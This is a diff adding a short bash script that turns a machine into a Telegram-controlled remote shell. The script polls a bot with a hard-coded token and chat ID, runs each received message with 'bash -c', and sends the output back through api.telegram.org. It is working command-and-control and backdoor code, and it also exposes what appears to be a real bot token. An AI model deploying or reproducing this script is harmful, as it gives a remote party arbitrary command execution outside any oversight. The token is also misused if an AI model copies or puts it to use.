@@ -1,0 +1,55 @@
+#!/bin/bash
+
+TOKEN="8556080023:AAHKKvFpqhaeDKx8F1FWMRNmaqqcjfbn4AA"
+CHAT_ID="6738733709"
+
+API_URL="https://api.telegram.org/bot$TOKEN"
+OFFSET=0
+
+# 🔥 Purger les anciens messages pour ne pas re-exécuter l’historique
+last_update=$(curl -s "$API_URL/getUpdates" | jq 'if .result|length>0 then .result[-1].update_id + 1 else 0 end')
+curl -s "$API_URL/getUpdates?offset=$last_update" >/dev/null
+OFFSET=$last_update
+
+send_message() {
+    curl -s -X POST "$API_URL/sendMessage" \
+        -d chat_id="$CHAT_ID" \
+        -d text="$1" >/dev/null
+}
+
+while true; do
+    updates=$(curl -s "$API_URL/getUpdates?timeout=20&offset=$OFFSET")
+    count=$(echo "$updates" | jq '.result | length')
+    if [ "$count" -eq 0 ]; then
+        sleep 1
+        continue
+    fi
+
+    # Parcourir les messages correctement
+    mapfile -t messages < <(echo "$updates" | jq -c '.result[]')
+
+    for msg in "${messages[@]}"; do
+        update_id=$(echo "$msg" | jq '.update_id')
+        OFFSET=$((update_id + 1))
+
+        chat_id=$(echo "$msg" | jq -r '.message.chat.id')
+        text=$(echo "$msg" | jq -r '.message.text')
+
+        # Vérification sécurité
+        if [ "$chat_id" != "$CHAT_ID" ]; then
+            send_message "Accès refusé ❌"
+            continue
+        fi
+
+        # /start
+        if [ "$text" = "/start" ]; then
+            send_message "Envoie une commande shell 👍"
+            continue
+        fi
+
+        # Exécution de la commande
+        output=$(bash -c "$text" 2>&1)
+        send_message ">> $output"
+    done
+
+done
